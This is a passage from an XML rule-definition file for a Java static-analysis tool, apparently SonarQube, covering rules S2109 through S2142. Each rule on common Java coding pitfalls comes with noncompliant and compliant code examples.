            if (this.getClass() != obj.getClass())
            return false;

            MyClass mc = (MyClass)obj;
            // ...
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2109' priority='MAJOR'>
        <configKey>S2109</configKey>
        <name>Reflection should not be used to check non-runtime annotations</name>
        <description>
            &lt;p&gt;The writer of an annotation can set one of three retention policies for it:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;RetentionPolicy.SOURCE&lt;/code&gt; - these annotations are dropped during
            compilation, E.G. &lt;code&gt;@Override&lt;/code&gt;,
            &lt;code&gt;@SuppressWarnings&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;RetentionPolicy.CLASS&lt;/code&gt; - these annotations are present in a compiled
            class but not loaded into the JVM at runtime. This is the
            default. &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;RetentionPolicy.RUNTIME&lt;/code&gt; - these annotations are present in the class
            file and loaded into the JVM. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Only annotations that have been given a &lt;code&gt;RUNTIME&lt;/code&gt; retention policy will be
            available to reflection. Testing for annotations with any
            other retention policy is simply an error, since the test will always return false.&lt;/p&gt;
            &lt;p&gt;This rule checks that reflection is not used to detect annotations that do not have &lt;code&gt;RUNTIME&lt;/code&gt;
            retention.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Method m = String.class.getMethod(&quot;getBytes&quot;, new Class[] {int.class,
            int.class, byte[].class, int.class});
            if (m.isAnnotationPresent(Override.class)) { // Noncompliant; test will always return false, even when
            @Override is present in the code
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2110' priority='MAJOR'>
        <configKey>S2110</configKey>
        <name>Invalid &quot;Date&quot; values should not be used</name>
        <description>
            &lt;p&gt;Whether the valid value ranges for &lt;code&gt;Date&lt;/code&gt; fields start with 0 or 1 varies by
            field. For instance, month starts at 0, and day of month
            starts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without
            error or exception. For instance, enter 12
            for month, and you'll get January of the following year.&lt;/p&gt;
            &lt;p&gt;This rule checks for bad values used in conjunction with &lt;code&gt;java.util.Date&lt;/code&gt;,
            &lt;code&gt;java.sql.Date&lt;/code&gt;, and
            &lt;code&gt;java.util.Calendar&lt;/code&gt;. Specifically, values outside of the valid ranges:&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;Field&lt;/th&gt;
            &lt;th&gt;Valid&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;month&lt;/td&gt;
            &lt;td&gt;0-11&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;date (day)&lt;/td&gt;
            &lt;td&gt;0-31&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;hour&lt;/td&gt;
            &lt;td&gt;0-23&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;minute&lt;/td&gt;
            &lt;td&gt;0-60&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;second&lt;/td&gt;
            &lt;td&gt;0-61&lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;p&gt;Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid
            uses of the 31st day of the month.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Date d = new Date();
            d.setDate(25);
            d.setYear(2014);
            d.setMonth(12); // Noncompliant; rolls d into the next year

            Calendar c = new GregorianCalendar(2014, 12, 25); // Noncompliant
            if (c.get(Calendar.MONTH) == 12) { // Noncompliant; invalid comparison
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Date d = new Date();
            d.setDate(25);
            d.setYear(2014);
            d.setMonth(11);

            Calendar c = new Gregorian Calendar(2014, 11, 25);
            if (c.get(Calendar.MONTH) == 11) {
            // ...
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2111' priority='MAJOR'>
        <configKey>S2111</configKey>
        <name>&quot;BigDecimal(double)&quot; should not be used</name>
        <description>
            &lt;p&gt;Because of floating point imprecision, you're unlikely to get the value you expect from the &lt;code&gt;BigDecimal(double)&lt;/code&gt;
            constructor. &lt;/p&gt;
            &lt;p&gt;From &lt;a href=&quot;http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)&quot;&gt;the
            JavaDocs&lt;/a&gt;:&lt;/p&gt;
            &lt;blockquote&gt;
            The results of this constructor can be somewhat unpredictable. One might assume that writing new
            BigDecimal(0.1) in Java creates a BigDecimal which
            is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to
            0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly
            as a double (or, for that matter, as a
            binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not
            exactly equal to 0.1, appearances
            notwithstanding.
            &lt;/blockquote&gt;
            &lt;p&gt;Instead, you should use &lt;code&gt;BigDecimal.valueOf&lt;/code&gt;, which uses a string under the
            covers to eliminate floating point rounding errors, or the
            constructor that takes a &lt;code&gt;String&lt;/code&gt; argument.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            double d = 1.1;

            BigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above
            BigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            double d = 1.1;

            BigDecimal bd1 = BigDecimal.valueOf(d);
            BigDecimal bd2 = new BigDecimal(&quot;1.1&quot;); // using String constructor will result in precise value
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/kzdGBQ&quot;&gt;CERT, NUM10-J.&lt;/a&gt; -
            Do not construct BigDecimal objects from floating-point literals
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2112' priority='MAJOR'>
        <configKey>S2112</configKey>
        <name>&quot;URL.hashCode&quot; and &quot;URL.equals&quot; should be avoided</name>
        <description>
            &lt;p&gt;The &lt;code&gt;equals&lt;/code&gt; and &lt;code&gt;hashCode&lt;/code&gt; methods of &lt;code&gt;java.net.URL&lt;/code&gt;
            both may trigger a name service (usually DNS) lookup to
            resolve the host name or IP address. Depending on the configuration, and network status, that can take a
            long time. &lt;code&gt;URI&lt;/code&gt; on the other hand
            makes no such calls and should be used instead unless the specific &lt;code&gt;URL&lt;/code&gt;
            functionality is required.&lt;/p&gt;
            &lt;p&gt;In general it is better to use the &lt;code&gt;URI&lt;/code&gt; class until access to the resource
            is actually needed, at which point you can just convert the
            &lt;code&gt;URI&lt;/code&gt; to a &lt;code&gt;URL&lt;/code&gt; using &lt;code&gt;URI.toURL()&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This rule checks for uses of &lt;code&gt;URL&lt;/code&gt; 's in &lt;code&gt;Map&lt;/code&gt; and
            &lt;code&gt;Set&lt;/code&gt; , and for explicit calls to the &lt;code&gt;equals&lt;/code&gt; and
            &lt;code&gt;hashCode&lt;/code&gt; methods.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void checkUrl(URL url) {
            Set&amp;lt;URL&amp;gt; sites = new HashSet&amp;lt;URL&amp;gt;(); // Noncompliant

            URL homepage = new URL(&quot;http://sonarsource.com&quot;); // Compliant
            if (homepage.equals(url)) { // Noncompliant
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void checkUrl(URL url) {
            Set&amp;lt;URI&amp;gt; sites = new HashSet&amp;lt;URI&amp;gt;(); // Compliant

            URI homepage = new URI(&quot;http://sonarsource.com&quot;); // Compliant
            URI uri = url.toURI();
            if (homepage.equals(uri)) { // Compliant
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2114' priority='MAJOR'>
        <configKey>S2114</configKey>
        <name>Collections should not be passed as arguments to their own methods</name>
        <description>
            &lt;p&gt;Passing a collection as an argument to the collection's own method is either an error - some other
            argument was intended - or simply nonsensical
            code. &lt;/p&gt;
            &lt;p&gt;Further, because some methods require that the argument remain unmodified during the execution,
            passing a collection to itself can result in
            undefined behavior. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            List &amp;lt;Object&amp;gt; objs = new ArrayList&amp;lt;Object&amp;gt;();
            objs.add(&quot;Hello&quot;);

            objs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called
            objs.addAll(objs); // Noncompliant; behavior undefined
            objs.containsAll(objs); // Noncompliant; always true
            objs.removeAll(objs); // Noncompliant; confusing. Use clear() instead
            objs.retainAll(objs); // Noncompliant; NOOP
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2115' priority='BLOCKER'>
        <configKey>S2115</configKey>
        <name>A secure password should be used when connecting to a database</name>
        <description>
            &lt;p&gt;When relying on the password authentication mode for the database connection, a secure password
            should be chosen.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an empty password is used.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Connection conn = DriverManager.getConnection(&quot;jdbc:derby:memory:myDB;create=true&quot;, &quot;login&quot;,
            &quot;&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String password = System.getProperty(&quot;database.password&quot;);
            Connection conn = DriverManager.getConnection(&quot;jdbc:derby:memory:myDB;create=true&quot;, &quot;login&quot;,
            password);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; - Broken
            Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data
            Exposure &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/521.html&quot;&gt;MITRE, CWE-521&lt;/a&gt;
            - Weak Password Requirements &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <cwe>521</cwe>
            <OWASP>A2,A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2116' priority='MAJOR'>
        <configKey>S2116</configKey>
        <name>&quot;hashCode&quot; and &quot;toString&quot; should not be called on array instances</name>
        <description>
            &lt;p&gt;While &lt;code&gt;hashCode&lt;/code&gt; and &lt;code&gt;toString&lt;/code&gt; are available on
            arrays, they are largely useless. &lt;code&gt;hashCode&lt;/code&gt; returns the array's
            &quot;identity hash code&quot;, and &lt;code&gt;toString&lt;/code&gt; returns nearly the same value. Neither
            method's output actually reflects the array's contents.
            Instead, you should pass the array to the relevant static &lt;code&gt;Arrays&lt;/code&gt; method.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public static void main( String[] args )
            {
            String argStr = args.toString(); // Noncompliant
            int argHash = args.hashCode(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public static void main( String[] args )
            {
            String argStr = Arrays.toString(args);
            int argHash = Arrays.hashCode(args);
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2118' priority='MAJOR'>
        <configKey>S2118</configKey>
        <name>Non-serializable classes should not be written</name>
        <description>
            &lt;p&gt;Nothing in a non-serializable class will be written out to file, and attempting to serialize such a
            class will result in an exception being thrown.
            Only a class that &lt;code&gt;implements Serializable&lt;/code&gt; or one that extends such a class can
            successfully be serialized (or de-serialized). &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Vegetable { // neither implements Serializable nor extends a class that does
            //...
            }

            public class Menu {
            public void meal() throws IOException {
            Vegetable veg;
            //...
            FileOutputStream fout = new FileOutputStream(veg.getName());
            ObjectOutputStream oos = new ObjectOutputStream(fout);
            oos.writeObject(veg); // Noncompliant. Nothing will be written
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Vegetable implements Serializable { // can now be serialized
            //...
            }

            public class Menu {
            public void meal() throws IOException {
            Vegetable veg;
            //...
            FileOutputStream fout = new FileOutputStream(veg.getName());
            ObjectOutputStream oos = new ObjectOutputStream(fout);
            oos.writeObject(veg);
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>serialization</tag>
    </rule>

    <rule key='S2119' priority='CRITICAL'>
        <configKey>S2119</configKey>
        <name>&quot;Random&quot; objects should be reused</name>
        <description>
            &lt;p&gt;Creating a new &lt;code&gt;Random&lt;/code&gt; object each time a random value is needed is
            inefficient and may produce numbers which are not random depending
            on the JDK. For better efficiency and randomness, create a single &lt;code&gt;Random&lt;/code&gt;, then
            store, and reuse it.&lt;/p&gt;
            &lt;p&gt;The &lt;code&gt;Random()&lt;/code&gt; constructor tries to set the seed with a distinct value every
            time. However there is no guarantee that the seed will be
            random or even uniformly distributed. Some JDK will use the current time as seed, which makes the generated
            numbers not random at all.&lt;/p&gt;
            &lt;p&gt;This rule finds cases where a new &lt;code&gt;Random&lt;/code&gt; is created each time a method is
            invoked and assigned to a local random variable.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomethingCommon() {
            Random rand = new Random(); // Noncompliant; new instance created with each invocation
            int rValue = rand.nextInt();
            //...
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private Random rand = SecureRandom.getInstanceStrong(); // SecureRandom is preferred to Random

            public void doSomethingCommon() {
            int rValue = this.rand.nextInt();
            //...
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;A class which uses a &lt;code&gt;Random&lt;/code&gt; in its constructor or in a static &lt;code&gt;main&lt;/code&gt;
            function and nowhere else will be ignored by this
            rule.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>owasp-a6</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2121' priority='MAJOR'>
        <configKey>S2121</configKey>
        <name>Silly String operations should not be made</name>
        <description>
            &lt;p&gt;Creating a substring from 0 to the end is silly. You'll end up with the same string you started
            with. Using the value of &lt;code&gt;String.length&lt;/code&gt;
            as either the start or end of a substring has similarly predictable results.&lt;/p&gt;
            &lt;p&gt;Calling &lt;code&gt;String.contains&lt;/code&gt; with the argument being identical to the String on
            which contains is invoked doesn't make sense.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String speech = &quot;Now is the time for all good people to come to the aid of their country.&quot;;

            String s1 = speech.substring(0); // Noncompliant. Yields the whole string
            String s2 = speech.substring(speech.length()); // Noncompliant. Yields &quot;&quot;;
            String s3 = speech.substring(5,speech.length()); // Noncompliant. Use the 1-arg version instead

            if (speech.contains(speech)) { // Noncompliant
            // always true
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String speech = &quot;Now is the time for all good people to come to the aid of their country.&quot;;

            String s1 = speech;
            String s2 = &quot;&quot;;
            String s3 = speech.substring(5);
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2122' priority='CRITICAL'>
        <configKey>S2122</configKey>
        <name>&quot;ScheduledThreadPoolExecutor&quot; should not have 0 core threads</name>
        <description>
            &lt;p&gt;&lt;code&gt;java.util.concurrent.ScheduledThreadPoolExecutor&lt;/code&gt;'s pool is sized with &lt;code&gt;corePoolSize&lt;/code&gt;,
            so setting &lt;code&gt;corePoolSize&lt;/code&gt;
            to zero means the executor will have no threads and run nothing.&lt;/p&gt;
            &lt;p&gt;This rule detects instances where &lt;code&gt;corePoolSize&lt;/code&gt; is set to zero, via either
            its setter or the object constructor.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void do(){

            ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant

            ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);
            stpe2.setCorePoolSize(0); // Noncompliant
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2123' priority='MAJOR'>
        <configKey>S2123</configKey>
        <name>Values should not be uselessly incremented</name>
        <description>
            &lt;p&gt;A value that is incremented or decremented and then not stored is at best wasted code and at worst
            a bug.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int pickNumber() {
            int i = 0;
            int j = 0;

            i = i++; // Noncompliant; i is still zero

            return j++; // Noncompliant; 0 returned
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int pickNumber() {
            int i = 0;
            int j = 0;

            i++;
            return ++j;
            }
            &lt;/pre&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S2127' priority='MAJOR'>
        <configKey>S2127</configKey>
        <name>&quot;Double.longBitsToDouble&quot; should not be used for &quot;int&quot;</name>
        <description>
            &lt;p&gt;&lt;code&gt;Double.longBitsToDouble&lt;/code&gt; expects a 64-bit, &lt;code&gt;long&lt;/code&gt;
            argument. Pass it a smaller value, such as an &lt;code&gt;int&lt;/code&gt; and the
            mathematical conversion into a &lt;code&gt;double&lt;/code&gt; simply won't work as anticipated because the
            layout of the bits will be interpreted incorrectly, as
            if a child were trying to use an adult's gloves.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int i = 42;
            double d = Double.longBitsToDouble(i); // Noncompliant
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2129' priority='MAJOR'>
        <configKey>S2129</configKey>
        <name>Constructors should not be used to instantiate &quot;String&quot;, &quot;BigInteger&quot;, &quot;BigDecimal&quot;
            and primitive-wrapper classes
        </name>
        <description>
            &lt;p&gt;Constructors for &lt;code&gt;String&lt;/code&gt;, &lt;code&gt;BigInteger&lt;/code&gt;, &lt;code&gt;BigDecimal&lt;/code&gt;
            and the objects used to wrap primitives should never be
            used. Doing so is less clear and uses more memory than simply using the desired value in the case of
            strings, and using &lt;code&gt;valueOf&lt;/code&gt; for
            everything else.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String empty = new String(); // Noncompliant; yields essentially &quot;&quot;, so just use that.
            String nonempty = new String(&quot;Hello world&quot;); // Noncompliant
            Double myDouble = new Double(1.1); // Noncompliant; use valueOf
            Integer integer = new Integer(1); // Noncompliant
            Boolean bool = new Boolean(true); // Noncompliant
            BigInteger bigInteger1 = new BigInteger(&quot;3&quot;); // Noncompliant
            BigInteger bigInteger2 = new BigInteger(&quot;9223372036854775807&quot;); // Noncompliant
            BigInteger bigInteger3 = new BigInteger(&quot;111222333444555666777888999&quot;); // Compliant, greater than
            Long.MAX_VALUE
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String empty = &quot;&quot;;
            String nonempty = &quot;Hello world&quot;;
            Double myDouble = Double.valueOf(1.1);
            Integer integer = Integer.valueOf(1);
            Boolean bool = Boolean.valueOf(true);
            BigInteger bigInteger1 = BigInteger.valueOf(3);
            BigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);
            BigInteger bigInteger3 = new BigInteger(&quot;111222333444555666777888999&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;&lt;code&gt;BigDecimal&lt;/code&gt; constructor with &lt;code&gt;double&lt;/code&gt; argument is
            ignored as using &lt;code&gt;valueOf&lt;/code&gt; instead might change resulting
            value. See &lt;a href='/coding_rules#rule_key=java%3AS2111'&gt;S2111&lt;/a&gt; .&lt;/p&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2130' priority='MINOR'>
        <configKey>S2130</configKey>
        <name>Parsing should be used to convert &quot;Strings&quot; to primitives</name>
        <description>
            &lt;p&gt;Rather than creating a boxed primitive from a &lt;code&gt;String&lt;/code&gt; to extract the
            primitive value, use the relevant &lt;code&gt;parse&lt;/code&gt; method
            instead. It will be clearer and more efficient.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String myNum = &quot;12.2&quot;;

            float f = (new Float(myNum)).floatValue(); // Noncompliant; creates &amp;amp; discards a Float
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String myNum = &quot;12.2&quot;;

            float f = Float.parseFloat(myNum);
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2131' priority='MAJOR'>
        <configKey>S2131</configKey>
        <name>Primitives should not be boxed just for &quot;String&quot; conversion</name>
        <description>
            &lt;p&gt;&quot;Boxing&quot; is the process of putting a primitive value into a primitive-wrapper object.
            When that's done purely to use the wrapper class'
            &lt;code&gt;toString&lt;/code&gt; method, it's a waste of memory and cycles because those methods are &lt;code&gt;static&lt;/code&gt;,
            and can therefore be used without a
            class instance. Similarly, using the &lt;code&gt;static&lt;/code&gt; method &lt;code&gt;valueOf&lt;/code&gt;
            in the primitive-wrapper classes with a non-&lt;code&gt;String&lt;/code&gt;
            argument should be avoided.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int myInt = 4;
            String myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp;amp; discards an Integer
            object
            myIntString = Integer.valueOf(myInt).toString(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int myInt = 4;
            String myIntString = Integer.toString(myInt);
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2133' priority='MAJOR'>
        <configKey>S2133</configKey>
        <name>Objects should not be created only to &quot;getClass&quot;</name>
        <description>
            &lt;p&gt;Creating an object for the sole purpose of calling &lt;code&gt;getClass&lt;/code&gt; on it is a
            waste of memory and cycles. Instead, simply use the class'
            &lt;code&gt;.class&lt;/code&gt; property.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            MyObject myOb = new MyObject(); // Noncompliant
            Class c = myOb.getClass();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Class c = MyObject.class;
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S2134' priority='MAJOR'>
        <configKey>S2134</configKey>
        <name>Classes extending java.lang.Thread should override the &quot;run&quot; method</name>
        <description>
            &lt;p&gt;According to the Java API documentation:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;There are two ways to create a new thread of execution. One is to declare a class to be a subclass
            of Thread. This subclass should override the
            run method of class Thread. An instance of the subclass can then be allocated and started...&lt;/p&gt;
            &lt;p&gt;The other way to create a thread is to declare a class that implements the Runnable interface. That
            class then implements the run method. An
            instance of the class can then be allocated, passed as an argument when creating Thread, and started.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;By definition, extending the Thread class without overriding the &lt;code&gt;run&lt;/code&gt;
            method doesn't make sense, and implies that the contract of the
            &lt;code&gt;Thread&lt;/code&gt; class is not well understood.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyRunner extends Thread { // Noncompliant; run method not overridden

            public void doSometing() {...}
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;If &lt;code&gt;run()&lt;/code&gt; is not overridden in a class extending &lt;code&gt;Thread&lt;/code&gt;,
            it means that starting the thread will actually call
            &lt;code&gt;Thread.run()&lt;/code&gt;. However, &lt;code&gt;Thread.run()&lt;/code&gt; does nothing if it has
            not been fed with a target &lt;code&gt;Runnable&lt;/code&gt;. The rule
            consequently ignore classes extending &lt;code&gt;Thread&lt;/code&gt; if they are calling, in their
            constructors, the &lt;code&gt;super(...)&lt;/code&gt; constructor with a
            proper &lt;code&gt;Runnable&lt;/code&gt; target.&lt;/p&gt;
            &lt;pre&gt;
            class MyThread extends Thread { // Compliant - calling super constructor with a Runnable
            MyThread(Runnable target) {
            super(target); // calling super constructor with a Runnable, which will be used for when Thread.run() is
            executed
            // ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2139' priority='MAJOR'>
        <configKey>S2139</configKey>
        <name>Exceptions should be either logged or rethrown but not both</name>
        <description>
            &lt;p&gt;In applications where the accepted practice is to log an &lt;code&gt;Exception&lt;/code&gt; and
            then rethrow it, you end up with miles-long logs that contain
            multiple instances of the same exception. In multi-threaded applications debugging this type of log can be
            particularly hellish because messages from
            other threads will be interwoven with the repetitions of the logged-and-thrown &lt;code&gt;Exception&lt;/code&gt;.
            Instead, exceptions should be either logged or
            rethrown, not both.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            catch (SQLException e) {
            ...
            LOGGER.log(Level.ERROR, contextInfo, e);
            throw new MySQLException(contextInfo, e);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            catch (SQLException e) {
            ...
            throw new MySQLException(contextInfo, e);
            }
            &lt;/pre&gt;
            &lt;p&gt;or &lt;/p&gt;
            &lt;pre&gt;
            catch (SQLException e) {
            ...
            LOGGER.log(Level.ERROR, contextInfo, e);
            // handle exception...
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S2140' priority='MINOR'>
        <configKey>S2140</configKey>
        <name>Methods of &quot;Random&quot; that return floating point values should not be used in random integer
            generation
        </name>
        <description>
            &lt;p&gt;There is no need to multiply the output of &lt;code&gt;Random&lt;/code&gt;'s &lt;code&gt;nextDouble&lt;/code&gt;
            method to get a random integer. Use the
            &lt;code&gt;nextInt&lt;/code&gt; method instead.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the return value of any of &lt;code&gt;Random&lt;/code&gt;'s methods
            that return a floating point value is converted to an
            integer.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Random r = new Random();
            int rand = (int)r.nextDouble() * 50; // Noncompliant way to get a pseudo-random value between 0 and 50
            int rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Random r = new Random();
            int rand = r.nextInt(50); // returns pseudo-random value between 0 and 50
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2142' priority='MAJOR'>
        <configKey>S2142</configKey>
        <name>&quot;InterruptedException&quot; should not be ignored</name>
        <description>
            &lt;p&gt;&lt;code&gt;InterruptedExceptions&lt;/code&gt; should never be ignored in the code, and simply
            logging the exception counts in this case as &quot;ignoring&quot;. The
            throwing of the &lt;code&gt;InterruptedException&lt;/code&gt; clears the interrupted state of the Thread, so
            if the exception is not handled properly the fact
            that the thread was interrupted will be lost. Instead, &lt;code&gt;InterruptedExceptions&lt;/code&gt; should
            either be rethrown - immediately or after cleaning up
            the method's state - or the thread should be re-interrupted by calling &lt;code&gt;Thread.interrupt()&lt;/code&gt;
            even if this is supposed to be a
            single-threaded application. Any other course of action risks delaying thread shutdown and loses the
            information that the thread was interrupted -
            probably without finishing its task.&lt;/p&gt;
            &lt;p&gt;Similarly, the &lt;code&gt;ThreadDeath&lt;/code&gt; exception should also be propagated. According
            to its JavaDoc:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;If &lt;code&gt;ThreadDeath&lt;/code&gt; is caught by a method, it is important that it be rethrown
            so that the thread actually dies.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void run () {
            try {
            while (true) {
            // do stuff
            }
            }catch (InterruptedException e) { // Noncompliant; logging is not enough
            LOGGER.log(Level.WARN, &quot;Interrupted!&quot;, e);
            }
            }
            &lt;/pre&gt;
